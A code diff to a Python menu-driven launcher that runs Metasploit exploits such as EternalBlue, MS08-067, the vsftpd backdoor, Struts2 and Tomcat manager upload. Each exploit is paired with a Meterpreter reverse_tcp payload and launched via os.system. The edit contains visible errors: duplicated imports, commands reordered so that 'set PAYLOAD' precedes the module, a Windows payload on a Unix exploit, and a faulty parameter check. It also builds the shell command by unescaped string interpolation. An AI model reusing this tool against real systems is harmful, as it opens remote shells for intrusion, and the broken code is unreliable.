@@ -476,6 +476,9 @@ import os
 import tempfile
 from colorama import Fore
 
+import os
+from colorama import Fore
+
 def metasploit_scan():
     try:
         while True:
@@ -516,24 +519,14 @@ def metasploit_scan():
                     "66": "exploit/multi/http/jboss_deployment_scanner",
                     "77": "exploit/windows/smb/ms17_010_eternalblue",
                     "108": "exploit/multi/http/tomcat_mgr_upload set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "110": "exploit/windows/dcerpc/ms03_026_dcom set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "112": "exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "114": "exploit/unix/ftp/vsftpd_234_backdoor set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "116": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "118": "exploit/multi/http/jboss_deployment_scanner set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+                    "110": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/dcerpc/ms03_026_dcom",
+                    "112": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/smb/ms08_067_netapi",
+                    "114": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/unix/ftp/vsftpd_234_backdoor",
+                    "116": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/struts2_code_exec",
+                    "118": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/jboss_deployment_scanner",
                     "120": "exploit/windows/smb/ms17_010_eternalblue set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                     "122": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "130": "exploit/unix/ftp/vsftpd_234_backdoor set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "140": "exploit/multi/http/jboss_deployment_scanner set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "150": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "160": "exploit/multi/http/tomcat_mgr_upload set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "170": "exploit/windows/smb/ms17_010_eternalblue set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "180": "exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "190": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "200": "exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "210": "exploit/windows/dcerpc/ms03_026_dcom set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                 }
-
 
                 # Display available exploits
                 for key, value in exploits.items():
@@ -574,21 +567,18 @@ def metasploit_scan():
                 print(Fore.RED + "Invalid choice. Please try again.")
                 continue
 
-            # Run the command in Metasploit
+            # Run the command in Metasploit directly (no file writing, faster)
             if metasploit_commands:
                 print(Fore.BLUE + "Launching Metasploit...")
 
-                # Create a temporary resource file to hold the Metasploit commands
-                with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.rc') as rc_file:
-                    rc_file.write(metasploit_commands)
-                    rc_file_path = rc_file.name
+                # Check if the necessary parameters are set
+                if 'RHOSTS' not in metasploit_commands and 'LHOST' not in metasploit_commands:
+                    print(Fore.RED + "Error: Missing RHOSTS or LHOST in the command. Aborting...")
+                    continue  # Skip this iteration if missing required parameters
 
-                # Use the -r option to pass the resource file to msfconsole for faster execution
-                full_command = f"msfconsole -q -r {rc_file_path}"
+                # Directly run the msfconsole with the command
+                full_command = f"msfconsole -q -x \"{metasploit_commands}\""
                 os.system(full_command)
-
-                # Delete the temporary resource file after execution
-                os.remove(rc_file_path)
                 break  # Exit the loop after launching Metasploit
 
     except Exception as e:
